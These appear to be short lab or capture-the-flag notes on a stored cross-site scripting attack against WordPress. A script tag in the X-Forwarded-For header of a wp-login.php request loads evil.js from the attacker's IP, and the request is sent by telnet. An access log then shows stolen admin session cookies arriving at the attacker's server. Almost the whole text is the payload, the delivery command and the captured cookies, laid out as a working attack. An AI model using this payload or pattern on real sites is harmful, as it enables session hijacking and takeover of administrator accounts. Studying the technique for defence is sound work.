####  telnet

- set `evil.js` under `/var/www/html/`

- request header

```
root@b30c33789e55:~# cat login-test.txt
POST /wp-login.php HTTP/1.1
Host: 103.253.147.154
Content-Length: 113
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8,nl;q=0.6
X-Forwarded-For: <script src="http://103.253.147.154/evil.js"></script>
Connection: close

log=wordpress&pwd=sdsdssdsdsd&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.28.135%2Fwp-admin%2F&testcookie=1
```

- telent ip port < login.txt

```
telnet 103.253.147.154 10001 < login.txt
```


- access log

```
172.17.0.1 - - [03/Jul/2018:08:24:13 +0000] "GET /eef4a6d53c97b055136de86e412b42ac/?wordpress_83a36c3823a99d03f5bfbf8df6230b6a=admin%7C1530779052%7CWHt2uWxewPMDedWIVFZFWPByDpinkMLnszvLA46cmkK%7C1d5b3da9de86a4f9f65719cc944b782810ad4a386fb7b7c19a68d39500e3f1e8;%20wordpress_test_cookie=WP+Cookie+check;%20wp-settings-time-1=1530606253;%20wordpress_logged_in_83a36c3823a99d03f5bfbf8df6230b6a=admin%7C1530779052%7CWHt2uWxewPMDedWIVFZFWPByDpinkMLnszvLA46cmkK%7C9cf0905e3ba7e98c69c7fa00ee542c01d2ce7f6945cb2e1a448b383d5a42484a HTTP/1.1" 200 490 "http://103.253.147.154:10001/eef4a6d53c97b055136de86e412b42ac/wp-admin/admin.php?page=activity_log_page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
```
